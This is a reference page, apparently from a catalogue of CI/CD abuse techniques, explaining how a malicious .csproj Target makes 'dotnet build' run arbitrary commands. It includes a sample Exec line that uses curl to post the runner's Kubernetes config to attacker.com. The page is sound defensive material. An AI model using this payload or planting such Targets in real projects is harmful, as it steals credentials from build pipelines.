---
layout: tool
title: dotnet
tags: [cli, config-file, eval-sh]
references:
- https://learn.microsoft.com/en-us/visualstudio/msbuild/exec-task
- https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets
files: [".csproj", ".vbproj"]
---

## Living Off The Pipeline - dotnet

The `dotnet` command-line interface (CLI) is the primary tool for building and running .NET applications. It uses MSBuild project files (e.g., `.csproj`), which can be manipulated by an attacker to execute arbitrary code, making `dotnet` a powerful "Living Off The Pipeline" (LOTP) tool.

### First-Order LOTP Tool

`dotnet` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) by processing a malicious `.csproj` file during a standard build process.

#### Malicious Primitive: Remote Code Execution (RCE)

A `.csproj` file is not just a data file; it is an executable MSBuild script. It can contain "Targets," which are blocks of code that run at specific points in the build lifecycle. An attacker can define a malicious `Target` that uses the `<Exec>` task to run an arbitrary shell command.

When a CI/CD pipeline runs a standard command like `dotnet build` or `dotnet test`, the MSBuild engine will parse the malicious `.csproj` file and execute the attacker's payload.

### Real-World Attack Scenario

1.  **Attacker's PR:** An attacker submits a pull request with a modified `.csproj` file containing a malicious `Target`. The `BeforeTargets="Build"` attribute ensures it runs before the main compilation.
    ```xml
    <Project Sdk="Microsoft.NET.Sdk">

      <PropertyGroup>
        <OutputType>Exe</OutputType>
        <TargetFramework>net8.0</TargetFramework>
      </PropertyGroup>

      <Target Name="Pwned" BeforeTargets="Build">
        <Exec Command="curl --data-binary @$HOME/.kube/config http://attacker.com/" />
      </Target>

    </Project>
    ```

2.  **Vulnerable Workflow:** The pipeline contains a completely standard command to build the project.
    ```yaml
    - name: Build .NET application
      run: dotnet build
    ```

3.  **Execution:**
    *   The `dotnet build` command is executed.
    *   The MSBuild engine parses the attacker's `.csproj` file.
    *   It finds the `Pwned` target and executes it before the `Build` target.
    *   The attacker's `Exec` command runs, exfiltrating sensitive files from the CI runner.

This attack is dangerous because the CI/CD workflow file is benign. The malicious payload is hidden inside the project's main configuration file.